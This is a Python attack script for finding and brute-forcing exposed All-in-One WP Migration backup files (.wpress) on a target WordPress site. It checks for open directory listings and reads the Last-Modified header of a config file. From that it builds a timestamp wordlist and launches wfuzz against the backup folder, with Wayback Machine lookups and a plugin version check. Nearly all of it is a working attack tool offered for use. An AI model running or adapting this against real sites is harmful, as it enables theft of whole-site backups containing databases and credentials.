#!/usr/bin/python3
# -*- coding: UTF-8 -*-
#
# All-in-One WP Migration Backup Finder
#
# Based Off @vavkamil's hard work - https://vavkamil.cz/2020/03/25/all-in-one-wp-migration/
#
# Script made by @random_robbie
#
# This script deals with if a wordpress site redirects so that you can ensure you get the right url and no 302s
#
# Requires Wfuzz installed
#
#
#
import requests
import concurrent.futures
from datetime import datetime, timedelta
import argparse
from urllib.parse import urlparse
import sys
import os
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


session = requests.Session()
parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", required=True, help="Wordpress Url")
parser.add_argument("-d","--delta", default=10, required=False, help="Number of minutes to check before and after the identified \"Last Modified\" date/time. Defaults to 10.")
args = parser.parse_args()
url = str(args.url)
range_val = int(args.delta)

headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0","Connection":"close","Accept":"*/*"}
response = session.get(url+"/wp-content/ai1wm-backups/web.config", headers=headers,verify=False)

def vercheck (url,headers):
	vercheck = session.get(""+url+"/wp-content/plugins/all-in-one-wp-migration/readme.txt", headers=headers,verify=False)
	if "7.15" in vercheck.text or "7.47" in vercheck.text:
		print("This version is not vulnerable sorry")
		sys.exit(0)

def lazycheck(url,headers):
	lazycheck = session.get(""+url+"/wp-content/ai1wm-backups/", headers=headers,verify=False)
	if ".wpress" in lazycheck.text:
		print ("[*] Do not need to bruteforce as the backup folder has directory listings enabled.[*] ")
		print ("[*] Please Browse to "+url+"/wp-content/ai1wm-backups/ to see exposed directory [*] ")
		sys.exit(0)

def multicheck(url,headers):
	domain = urlparse(url).netloc
	multicheck = session.get(""+url+"/wp-content/ai1wm-backups/"+domain+"-", headers=headers,verify=False)
	if multicheck.status_code == 300:
		soup = BeautifulSoup(multicheck.text, "html.parser")
		print ("[*] Following Backups have been found [*] \n")
		for link in soup.findAll('a'):
			print(""+url+""+link.get('href')+"")
		sys.exit(0)

def wayback(domain,headers):
	wayback = session.get("http://web.archive.org/cdx/search/cdx?url="+url+"*&output=txt&fl=original&collapse=urlkey", headers=headers,verify=False)
	if "wp-content/ai1wm-backups" in wayback.text:
		print ("[*] OOOOOOO Wayback machine has a potenital url to check.")
		for line in wayback.content:
			if ".wpress" in line:
				print (line)

def datetime_range(start, end, delta):
	current = start
	while current < end:
		yield current
		current += delta


try:
	print ("Checking Exposed Backup Dir")
	lazycheck(url,headers)
	multicheck(url,headers)
	if response.status_code == 200:
		if ".wpress" in response.text:
			last_modified = response.headers['last-modified']
			timestamp = datetime.strptime(last_modified,"%a, %d %b %Y %H:%M:%S %Z")
			time_ymd = timestamp.strftime("%Y%m%d")
			time_max = timestamp + timedelta(minutes = range_val)
			time_min = timestamp - timedelta(minutes = range_val)
			print("Creating WFUZZ payload...")
			dts = [dt.strftime('%H%M%S') for dt in datetime_range(time_min, time_max, timedelta(seconds=1))]
			PAYLOAD = "timerange.txt"
			f = open(PAYLOAD, "w")
			for ts in dts:
				for x in range(100,999):	
					f.write("%s-%s\n" % (ts,x))
			print("Payload creation complete. Payload file: ./timerange.txt")
			r = session.get(""+url+"", headers=headers,verify=False)
			domain = urlparse(r.url).netloc
			print ("Checking Wayback Urls")
			wayback(domain,headers)
			print ("Checking Plugin Version")
			vercheck (url,headers)
			print ("[*] Terminate WFuzz if you are not seeing 404 or 200 responses as this means error or rate limited. [*] ")
			try:
				command = ("wfuzz --oF /tmp/session -s 1 --field r -c -w ./timerange.txt -X HEAD --sc 200,300,303 "+r.url+"wp-content/ai1wm-backups/"+domain+"-"+time_ymd+"-FUZZ.wpress")
				print ("[*] Wfuzz using the following command: "+command+" [*]")
				os.system(command)
			except KeyboardInterrupt:
				print ("Ctrl-c pressed ...")
				sys.exit(1)

			except Exception as e:
				print('Error: %s' % e)
				sys.exit(1)
		else:
			print("[*] Unable to grab config file. [*]")
			print("[*] Got the Following Response. [*]")
			print(response.text)

	if response.status_code == 403:
		print("[*] WAF Blocking Got 403 [*]")
	if response.status_code == 401:
		print("[*] WAF Blocking Got 401 [*]")

except Exception as e:
		print('Error: %s' % e)
